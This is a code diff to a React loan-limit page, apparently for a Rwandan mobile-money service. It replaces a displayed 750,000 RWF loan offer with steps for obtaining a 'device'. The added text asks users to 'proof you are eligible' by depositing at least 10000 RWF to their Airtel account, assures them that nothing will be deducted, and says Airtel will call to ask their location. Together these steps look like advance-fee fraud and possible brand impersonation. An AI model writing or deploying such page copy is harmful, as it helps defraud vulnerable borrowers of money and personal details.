@@ -141,32 +141,15 @@ export default function LoanLimitPage() {
 
       {/* Loan Limit Section */}
       <h2 className="text-2xl sm:text-4xl font-black text-black mb-2 sm:mb-4">Your Loan Limit</h2>
-      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Here is the amount you can borrow</p>
+      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Here is the steps to get the device:</p>
 
-      {/* Loan Amount Card */}
-      <div className="bg-gradient-to-br from-red-50 to-red-100 border-2 border-red-400 rounded-2xl sm:rounded-3xl p-8 sm:p-12 mb-8 sm:mb-12 text-center">
-        <p className="text-gray-600 text-sm sm:text-base mb-3 sm:mb-4">Available Loan Amount</p>
-        <div className="flex items-center justify-center gap-2 mb-2">
-          <h3 className="text-4xl sm:text-5xl font-black text-black">750,000</h3>
-        </div>
-        <p className="text-gray-600 text-base sm:text-lg">RWF</p>
-      </div>
-
+      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">1. Make sure you use your registered Airtel number</p>
+      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">2. Proof you are eligible by deposit atleast 10000 RWF or the deposit Amount to your Airtel.  </p>
+       <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Note : No Amount will be deducted before you receive the device. </p>
+      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">3. You willl receive a call from Airtel then ask you for location. </p>
+      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">4. The device will be delivered or you can pick it up at our store. </p>
       {/* Details Section */}
-      <div className="space-y-4 mb-8 sm:mb-12">
-        <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
-          <span className="text-gray-600 font-semibold text-sm sm:text-base">Loan Term</span>
-          <span className="text-black font-bold text-sm sm:text-base">12 months</span>
-        </div>
-        <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
-          <span className="text-gray-600 font-semibold text-sm sm:text-base">Interest Rate</span>
-          <span className="text-black font-bold text-sm sm:text-base">13%</span>
-        </div>
-        <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
-          <span className="text-gray-600 font-semibold text-sm sm:text-base">Processing Fee</span>
-          <span className="text-black font-bold text-sm sm:text-base">Free</span>
-        </div>
-      </div>
+  
 
       {/* Continue Button */}
       <button 
